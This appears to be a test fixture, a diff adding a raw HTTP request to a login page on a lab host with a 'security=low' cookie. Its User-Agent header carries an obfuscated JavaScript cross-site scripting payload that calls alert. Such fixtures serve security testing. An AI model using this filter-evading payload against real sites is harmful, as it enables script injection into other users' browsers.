@@ -1,0 +1,8 @@
+GET /login.php HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: `${class x extends `${alert`1337`}`{}}`{}
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Cookie: PHPSESSID=fd59hv21h7e37bo8ua7ole38h0; security=low
+
